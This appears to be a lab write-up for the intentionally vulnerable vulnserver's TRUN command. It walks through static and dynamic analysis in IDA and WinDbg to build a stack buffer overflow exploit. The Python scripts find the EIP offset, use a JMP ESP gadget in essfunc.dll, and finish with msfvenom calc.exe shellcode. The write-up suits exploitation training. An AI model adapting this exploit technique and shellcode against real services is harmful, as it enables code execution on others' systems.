## <ins>TRUN</ins>

Instead of fuzzing the TRUN command (like most writeups do) I will utilise a combination of static and dynamic analysis in order to build a working exploit.

For now, stack protections are disabled and the only challenge is to gain code execution.

When executing the vulnserver application we are greeted with some text which we can also find when opening the application in IDA and following the first few code blocks:

![e281afc55e05b7993d54a9f2a063446f.png](:../../../99\)%20Images/ed6dfdc7e4fa46de8c2f477f0ddccb9e.png)

Using tcpview from sysinternals showed that the application is listening on port 9999 TCP:

![d2a8996546db9ceee1b0800c610c62b9.png](:../../../99\)%20Images/576bf9d55aa4459cb66eda24f821bf1c.png)

I wrote a small python script to send some gibberish to the application and follow the execution flow in IDA and WinDbg:

```Python
#!/usr/bin/python3

import socket, sys
from struct import pack

ip = sys.argv[1]
port = 9999		

prefix = b''
buffer = b'w00tw00t'

payload = prefix + buffer 

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
```

As the application is using TCP, a breakpoint can be set at `WS2_32!recv`.

After executing the python script, the breakpoint gets hit and the process gets interruped at `WS2_32!recv`:

![3385f2f4b8d4f053409c2822e1c31a98.png](:../../../99\)%20Images/475c344952004eefb23ea8093f15685b.png)

Using `pt` and `p` it is possible to step out of the receive function, back into the caller function.

Following that address in IDA (`00401958`) it is possible to get a broad overview of what happens to the input received.

Various call to `_strncmp` are made comparing the first few characters of the buffer with some static strings:

![539068a3d142676a59cc83db879379b4.png](:../../../99\)%20Images/f79e0906a224488d80f6cb3939bbe384.png)

This section is targeting the TRUN command, so the following changes were made to the python script:

```Python
[...]

prefix = b'TRUN '
buffer = b'A' * 4096

payload = prefix + buffer 

[...]
```

After executing the new script and following the execution flow to the string compare with `TRUN` the jump is not taken, meaning the comparison returned 0,

vulnserver is allocating a new memory region using `_malloc` and then initialising it using `_memset`, afterwards a byte comparison at a specific offset is made. If the byte at that specific offset contains a dot (.) a jump is made to a basic block containing a call to `_strncpy` which might be exploitable.

![97c852f58475648140d9de9e55076dfa.png](:../../../99\)%20Images/91d168f04192486bab5e4f91b0b15f73.png)

In order to obtain that specific offset in the buffer, the A's were replaced with a unique string pattern created using msf-pattern_create:
`msf-pattern_create -l 4096`

```Python
[...]

prefix = b'TRUN '
buffer = b'Aa0Aa1Aa2Aa3A[...]3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F'

payload = prefix + buffer 

[...]
```

A breakpoint was set at the comparison with `2Eh` and the script was executed.
Dumping the bytes EAX points to reveals that the comparison is starting at the very beginning of the buffer (prefix excluded):

![ff911a7394932f5cec8495af9ea93f92.png](:../../../99\)%20Images/21c5bcf08ef64b6fbbab886921b9d54f.png)

If the comparison fails (there is no dot at that offset), the offset will be increased and the next byte gets checked. This means in order to perform a jump to the basic block containing a `strncpy` the only requirement the buffer has to meet is containing a dot somewhere.

Letting the application run using `g` leads to an access violation where EIP is storing `43396f43`.

This value is equivalent to offset 2007 in the unique pattern string.

The following modifications to the python script were made in order to calculate the available buffer space:

```Python
prefix = b'TRUN '
buffer = b'.' * 2007
eip = pack('<L', 0x42424242)   
junk = b'C' * 1024

payload = prefix + buffer + eip + junk
```

After EIP gets overwriten with 0x42424242 it is possible to dump the stack and check the last address containing 0x43434343 (CCCC). Then this address gets subtracted from the address stored in ESP:

![a306bd38d875d67017fbf683b6f4fbd8.png](:../../../99\)%20Images/7152fc99e6d94815bca025e0a56cf161.png)

Following this step someone would usually check for badchars (besides 0x00) but as there aren't any in the TRUN command, this step will be skipped here.

As the base address of the vulnserver binary contains a NULL-byte, it cannot be used to look for gadgets.

Instead essfunc.dll can be used, as this module gets loaded at `62500000` and does not have ASLR enabled (which can be checked using narly)
![9cb873592f6c13c4fcdae41f78d06ec5.png](:../../../99\)%20Images/bff263daa0fc47e3a5d04ff30bb6a098.png)

Knowing this, essfunc can be searched for a `JMP ESP` or `CALL ESP` instruction using the WinDbg search function:

![4baade0e651a260191c045a5726a1772.png](:../../../99\)%20Images/3edc289a45494e92a598efecb74e4f09.png)

At this stage, it is already possible to put everything together and craft a working exploit.

```Python
[...]

prefix = b'TRUN '
buffer = b'.' * 2007
eip = pack('<L', 0x625011af)   

nops = b'\x90' * 16

# msfvenom -p windows/exec cmd=calc.exe -b "\x00" EXITFUNC=thread -f py -v shellcode
shellcode =  b""
shellcode += b"\xda\xce\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x31"
shellcode += b"\xba\x99\xf4\x2d\xd4\x31\x50\x18\x83\xc0\x04"
shellcode += b"\x03\x50\x8d\x16\xd8\x28\x45\x54\x23\xd1\x95"
shellcode += b"\x39\xad\x34\xa4\x79\xc9\x3d\x96\x49\x99\x10"
shellcode += b"\x1a\x21\xcf\x80\xa9\x47\xd8\xa7\x1a\xed\x3e"
shellcode += b"\x89\x9b\x5e\x02\x88\x1f\x9d\x57\x6a\x1e\x6e"
shellcode += b"\xaa\x6b\x67\x93\x47\x39\x30\xdf\xfa\xae\x35"
shellcode += b"\x95\xc6\x45\x05\x3b\x4f\xb9\xdd\x3a\x7e\x6c"
shellcode += b"\x56\x65\xa0\x8e\xbb\x1d\xe9\x88\xd8\x18\xa3"
shellcode += b"\x23\x2a\xd6\x32\xe2\x63\x17\x98\xcb\x4c\xea"
shellcode += b"\xe0\x0c\x6a\x15\x97\x64\x89\xa8\xa0\xb2\xf0"
shellcode += b"\x76\x24\x21\x52\xfc\x9e\x8d\x63\xd1\x79\x45"
shellcode += b"\x6f\x9e\x0e\x01\x73\x21\xc2\x39\x8f\xaa\xe5"
shellcode += b"\xed\x06\xe8\xc1\x29\x43\xaa\x68\x6b\x29\x1d"
shellcode += b"\x94\x6b\x92\xc2\x30\xe7\x3e\x16\x49\xaa\x54"
shellcode += b"\xe9\xdf\xd0\x1a\xe9\xdf\xda\x0a\x82\xee\x51"
shellcode += b"\xc5\xd5\xee\xb3\xa2\x3a\x0d\x16\xde\xd2\x88"
shellcode += b"\xf3\x63\xbf\x2a\x2e\xa7\xc6\xa8\xdb\x57\x3d"
shellcode += b"\xb0\xa9\x52\x79\x76\x41\x2e\x12\x13\x65\x9d"
shellcode += b"\x13\x36\x06\x40\x80\xda\xe7\xe7\x20\x78\xf8"

payload = prefix + buffer + eip + nops + shellcode

[...]
```

As we specified one bad character, an encoder was used, meaning it is mandatory to add a NOP-slide before the actual shellcode, so that the decoder works without breaking the shellcode.
